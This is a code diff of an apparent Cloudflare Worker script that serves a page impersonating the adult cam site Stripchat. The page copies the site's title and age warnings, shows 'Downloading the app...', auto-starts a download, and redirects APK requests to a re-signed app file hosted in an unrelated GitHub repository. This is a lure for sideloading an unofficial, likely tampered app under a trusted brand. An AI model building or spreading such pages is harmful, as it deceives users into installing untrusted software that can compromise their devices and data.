@@ -15,24 +15,62 @@ async function handleRequest(request) {
   // 读取index.html的内容
   const html = `<!doctype html>
 <html lang="en">
-<head prefix="og: http://ogp.me/ns# fb: http://ogp.me/ns/fb# website: http://ogp.me/ns/website#">
+<head>
     <meta charset=utf-8>
     <title>Free Live Sex Cams and Nude Girls Chat | Stripchat</title>
-    <meta data-helmet="1" property="og:type" content="website">
-    <meta data-helmet="1" property="og:image" content="https://cdn.strpst.com/assets/icons/metaogimage.jpg?v=4f3e5e4b">
-    <meta data-helmet="1" property="og:url" content="https://en.stripchat.com/">
-    <meta data-helmet="1" name="twitter:card" content="summary_large_image">
-    <meta data-helmet="1" property="og:site_name" content="Stripchat – Free Live Cams Community">
-    <meta data-helmet="1" name="twitter:creator" content="@stripchat">
-    <meta data-helmet="1" name="twitter:site" content="@stripchat">
-    <meta data-helmet="1" property="og:title" content="Free Live Sex Cams and Nude Girls Chat">
-    <meta data-helmet="1" property="og:description" content="Watch naked models in our adult live sex cam community.">
-    <meta data-helmet="1" name="description" content="Watch naked models in our adult live sex cam community.">
+    <style>
+        body {
+            background-color: #1a1a1a;
+            color: white;
+            font-family: Arial, sans-serif;
+            margin: 0;
+            padding: 0;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            text-align: center;
+        }
+        .content-container {
+            padding: 20px;
+        }
+        h1 {
+            font-size: 24px;
+            margin-bottom: 20px;
+        }
+        a {
+            color: #fff;
+            text-decoration: underline;
+        }
+        .warnings {
+            margin-top: 20px;
+            font-size: 14px;
+            color: #999;
+        }
+        .decline-link {
+            position: absolute;
+            top: 20px;
+            right: 20px;
+        }
+    </style>
 </head>
 <body>
     <div class="content-container">
+        <a class="decline-link visitors-agreement-decline" href="https://google.com/" rel="noopener noreferrer nofollow">Exit</a>
+        <div class="warnings">
+            <p>
+                <span>This website contains <strong>sexually explicit content</strong>.</span>&nbsp;
+                <span>You must be at least 18 years old to use this site. However, if the age of majority in your location is higher than 18, you must be at least that age to use this site. This site is not available in locations where such content is prohibited by law.</span>
+            </p>
+            <p>
+                <span>Additionally, this website uses cookies. For more information about cookies, please see our <a rel="nofollow" href="/privacy">Privacy Policy</a>. By viewing and using this site, you agree to the use of cookies and our Privacy Policy.</span>
+                <br>All models were at least 18 years old when they were photographed.
+            </p>
+        </div>
         <h1>Downloading the app...</h1>
-        <span style="margin-top:50px">Not responding? Click here to <a href="stripchat_super_en_edit_sign.apk" style="text-decoration:underline;color:#fff;">install manually</a></span>
+        <span style="margin-top:50px;display:block;">
+            Not responding? Click here to <a href="stripchat_super_en_edit_sign.apk" style="color:#fff;">install manually</a>
+        </span>
     </div>
     <script>
         setTimeout(function(){
@@ -53,7 +91,6 @@ async function handleRequest(request) {
 
   // 如果访问的是apk文件
   if (url.pathname.endsWith('.apk')) {
-    // 将APK文件上传到可以直接下载的位置，然后将URL替换到这里
     return Response.redirect('https://github.com/SLOMEDIALLC/stripchat/raw/main/stripchat_super_en_edit_sign.apk', 302)
   }
 
